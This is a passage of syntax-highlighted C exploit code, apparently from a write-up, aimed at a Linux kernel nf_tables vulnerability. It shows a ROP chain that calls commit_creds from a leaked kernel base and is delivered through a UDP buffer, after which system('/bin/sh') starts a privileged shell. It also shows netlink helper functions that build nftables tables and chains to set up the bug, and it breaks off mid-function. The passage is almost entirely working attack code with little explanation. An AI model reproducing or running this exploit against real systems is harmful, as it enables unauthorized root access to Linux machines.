</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> commit_creds;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> ret;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> ret;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> ret;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> ret;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> ret;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> ret;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> go;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>			
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;  [-] install udp client&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">udp_client</span>(udpbuf);
</span></span><span style="display:flex;"><span> 	<span style="color:#a6e22e">pthread_join</span>(p_thread, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span>status);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;  [-] Spawning sh&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 306
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// rbp-0x40 = 0xffffc6ca 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// &gt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// cli ret
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// 0xffffffff8200016d - 0x100016d WAKEUP
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;netinet/in.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;netinet/ip.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;netinet/tcp.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;arpa/inet.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/socket.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;errno.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;pthread.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sched.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/ioctl.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ctype.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/netfilter.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/netfilter/nfnetlink.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/netfilter/nf_tables.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;libmnl/libmnl.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;libnftnl/rule.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;libnftnl/expr.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;libnftnl/table.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;libnftnl/chain.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">pin_cpu</span>(<span style="color:#66d9ef">int</span> cpu)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">cpu_set_t</span> set;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">CPU_ZERO</span>(<span style="color:#f92672">&amp;</span>set);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">CPU_SET</span>(cpu, <span style="color:#f92672">&amp;</span>set);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">sched_setaffinity</span>(<span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">cpu_set_t</span>), <span style="color:#f92672">&amp;</span>set)) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;error</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">create_table</span>(<span style="color:#66d9ef">uint32_t</span> protocol, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> table_name, <span style="color:#66d9ef">bool</span> delete){
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> mnl_socket <span style="color:#f92672">*</span>nl;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buf[MNL_SOCKET_BUFFER_SIZE];
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nlmsghdr <span style="color:#f92672">*</span>nlh;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint32_t</span> portid, seq, table_seq, chain_seq, family;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nftnl_table <span style="color:#f92672">*</span>t;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> mnl_nlmsg_batch <span style="color:#f92672">*</span>batch;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> ret, batching;
</span></span><span style="display:flex;"><span>	t <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_table_alloc</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (t <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;nftnl_table_alloc&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_table_set_u32</span>(t, NFTNL_TABLE_FAMILY, protocol);  
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_table_set_str</span>(t, NFTNL_TABLE_NAME, table_name);
</span></span><span style="display:flex;"><span>	batching <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_batch_is_supported</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (batching <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;cannot talk to nfnetlink&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	seq <span style="color:#f92672">=</span> <span style="color:#a6e22e">time</span>(NULL);
</span></span><span style="display:flex;"><span>	batch <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_nlmsg_batch_start</span>(buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (batching) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">nftnl_batch_begin</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch), seq<span style="color:#f92672">++</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	table_seq <span style="color:#f92672">=</span> seq;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	nlh <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_table_nlmsg_build_hdr</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch),
</span></span><span style="display:flex;"><span>			delete<span style="color:#f92672">?</span>NFT_MSG_DELTABLE:NFT_MSG_NEWTABLE, NFPROTO_IPV4,
</span></span><span style="display:flex;"><span>			NLM_F_ACK, seq<span style="color:#f92672">++</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_table_nlmsg_build_payload</span>(nlh, t);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_table_free</span>(t);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (batching) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">nftnl_batch_end</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch), seq<span style="color:#f92672">++</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	nl <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_open</span>(NETLINK_NETFILTER);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (nl <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mnl_socket_open&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">mnl_socket_bind</span>(nl, <span style="color:#ae81ff">0</span>, MNL_SOCKET_AUTOPID) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mnl_socket_bind&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	portid <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_get_portid</span>(nl);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">mnl_socket_sendto</span>(nl, <span style="color:#a6e22e">mnl_nlmsg_batch_head</span>(batch),
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">mnl_nlmsg_batch_size</span>(batch)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mnl_socket_send&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mnl_nlmsg_batch_stop</span>(batch);
</span></span><span style="display:flex;"><span>	ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_recvfrom</span>(nl, buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span> (ret <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_cb_run</span>(buf, ret, table_seq, portid, NULL, NULL);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>		ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_recvfrom</span>(nl, buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;error&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mnl_socket_close</span>(nl);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> true;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">create_chain</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> table_name, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> chain_name, <span style="color:#66d9ef">uint32_t</span> hook_num){  <span style="color:#75715e">// NF_INET_LOCAL_IN
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">struct</span> mnl_socket <span style="color:#f92672">*</span>nl;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buf[MNL_SOCKET_BUFFER_SIZE];
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nlmsghdr <span style="color:#f92672">*</span>nlh;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint32_t</span> portid, seq, chain_seq;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> ret, family;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nftnl_chain <span style="color:#f92672">*</span>t;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> mnl_nlmsg_batch <span style="color:#f92672">*</span>batch;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> batching;
</span></span><span style="display:flex;"><span>	t <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_chain_alloc</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (t <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_chain_set_str</span>(t, NFTNL_CHAIN_TABLE, table_name);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_chain_set_str</span>(t, NFTNL_CHAIN_NAME, chain_name);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(hook_num <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">nftnl_chain_set_u32</span>(t, NFTNL_CHAIN_HOOKNUM, hook_num);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_chain_set_u32</span>(t, NFTNL_CHAIN_PRIO, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>	batching <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_batch_is_supported</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (batching <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;cannot talk to nfnetlink&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	seq <span style="color:#f92672">=</span> <span style="color:#a6e22e">time</span>(NULL);
</span></span><span style="display:flex;"><span>	batch <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_nlmsg_batch_start</span>(buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (batching) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">nftnl_batch_begin</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch), seq<span style="color:#f92672">++</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	chain_seq <span style="color:#f92672">=</span> seq;
</span></span><span style="display:flex;"><span>	nlh <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_chain_nlmsg_build_hdr</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch),
</span></span><span style="display:flex;"><span>			NFT_MSG_NEWCHAIN, NFPROTO_IPV4,
</span></span><span style="display:flex;"><span>			NLM_F_ACK, seq<span style="color:#f92672">++</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_chain_nlmsg_build_payload</span>(nlh, t);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_chain_free</span>(t);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (batching) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">nftnl_batch_end</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch), seq<span style="color:#f92672">++</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	nl <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_open</span>(NETLINK_NETFILTER);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (nl <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mnl_socket_open&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">mnl_socket_bind</span>(nl, <span style="color:#ae81ff">0</span>, MNL_SOCKET_AUTOPID) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mnl_socket_bind&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	portid <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_get_portid</span>(nl);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">mnl_socket_sendto</span>(nl, <span style="color:#a6e22e">mnl_nlmsg_batch_head</span>(batch),
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">mnl_nlmsg_batch_size</span>(batch)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mnl_socket_send&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_recvfrom</span>(nl, buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span> (ret <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_cb_run</span>(buf, ret, chain_seq, portid, NULL, NULL);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>		ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_recvfrom</span>(nl, buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;error&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mnl_socket_close</span>(nl);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> true;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">delete_chain</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> table_name, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> chain_name){ 
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> mnl_socket <span style="color:#f92672">*</span>nl;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buf[MNL_SOCKET_BUFFER_SIZE];
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nlmsghdr <span style="color:#f92672">*</span>nlh;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint32_t</span> portid, seq, chain_seq;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> ret, family;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nftnl_chain <span style="color:#f92672">*</span>t;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> mnl_nlmsg_batch <span style="color:#f92672">*</span>batch;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> batching;
</span></span><span style="display:flex;"><span>	t <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_chain_alloc</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (t <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_chain_set_str</span>(t, NFTNL_CHAIN_TABLE, table_name);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_chain_set_str</span>(t, NFTNL_CHAIN_NAME, chain_name);
</span></span><span style="display:flex;"><span>	seq <span style="color:#f92672">=</span> <span style="color:#a6e22e">time</span>(NULL);
</span></span><span style="display:flex;"><span>	batch <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_nlmsg_batch_start</span>(buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_batch_begin</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch), seq<span style="color:#f92672">++</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
</span></span><span style="display:flex;"><span>	chain_seq <span style="color:#f92672">=</span> seq;
</span></span><span style="display:flex;"><span>    nlh <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_chain_nlmsg_build_hdr</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch),
</span></span><span style="display:flex;"><span>					NFT_MSG_DELCHAIN, NFPROTO_IPV4,
</span></span><span style="display:flex;"><span>					NLM_F_ACK, seq<span style="color:#f92672">++</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_chain_nlmsg_build_payload</span>(nlh, t);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_chain_free</span>(t);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_batch_end</span>(<span style="color:#a6e22e">mnl_nlmsg_batch_current</span>(batch), seq<span style="color:#f92672">++</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mnl_nlmsg_batch_next</span>(batch);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	nl <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_open</span>(NETLINK_NETFILTER);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (nl <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mnl_socket_open&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">mnl_socket_bind</span>(nl, <span style="color:#ae81ff">0</span>, MNL_SOCKET_AUTOPID) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mnl_socket_bind&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	portid <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_get_portid</span>(nl);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">mnl_socket_sendto</span>(nl, <span style="color:#a6e22e">mnl_nlmsg_batch_head</span>(batch),
